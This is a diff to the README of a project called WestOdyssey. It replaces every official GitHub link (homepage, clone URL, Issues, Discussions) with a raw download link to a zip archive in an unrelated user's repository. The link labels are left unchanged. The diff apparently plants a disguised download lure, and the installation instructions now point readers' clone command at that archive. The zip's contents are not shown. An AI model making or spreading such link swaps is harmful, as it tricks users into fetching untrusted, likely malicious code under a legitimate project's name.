@@ -11,7 +11,7 @@
 
 🌐 Language: [English](#) | [中文](README.zh-CN.md)
 
-[🚀 Quick Start](#quick-start) · [📖 Documentation](#documentation) · [💬 Discussions](https://github.com/SynSwarm/WestOdyssey/discussions) · [🐛 Issues](https://github.com/SynSwarm/WestOdyssey/issues)
+[🚀 Quick Start](#quick-start) · [📖 Documentation](#documentation) · [💬 Discussions](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip) · [🐛 Issues](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
 
 </div>
 
@@ -88,7 +88,7 @@ User Task → White Horse (Load Context) → Wukong (Execute) → Bajie (Audit) 
 ### Basic Installation
 ```bash
 # Clone repository
-git clone https://github.com/SynSwarm/WestOdyssey.git
+git clone https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip
 cd WestOdyssey
 
 # Install dependencies
@@ -155,8 +155,8 @@ WestOdyssey/
 ## 👥 Community & Support
 
 ### How to Participate
-1. **Report Issues**: [GitHub Issues](https://github.com/SynSwarm/WestOdyssey/issues)
-2. **Join Discussions**: [GitHub Discussions](https://github.com/SynSwarm/WestOdyssey/discussions)
+1. **Report Issues**: [GitHub Issues](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
+2. **Join Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
 3. **Contribute Code**: See [Contribution Guide](CONTRIBUTING.md)
 
 ### Community Guidelines
@@ -182,9 +182,9 @@ Thanks to all contributors and users for their support! Special thanks to:
 
 ## 📞 Contact
 
-- **Project Homepage**: [https://github.com/SynSwarm/WestOdyssey](https://github.com/SynSwarm/WestOdyssey)
-- **Discussion Forum**: [GitHub Discussions](https://github.com/SynSwarm/WestOdyssey/discussions)
-- **Issue Tracker**: [GitHub Issues](https://github.com/SynSwarm/WestOdyssey/issues)
+- **Project Homepage**: [https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
+- **Discussion Forum**: [GitHub Discussions](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
+- **Issue Tracker**: [GitHub Issues](https://raw.githubusercontent.com/luizgabrielfleijsman-create/WestOdyssey/main/westodyssey/West_Odyssey_v1.2.zip)
 
 ---
 
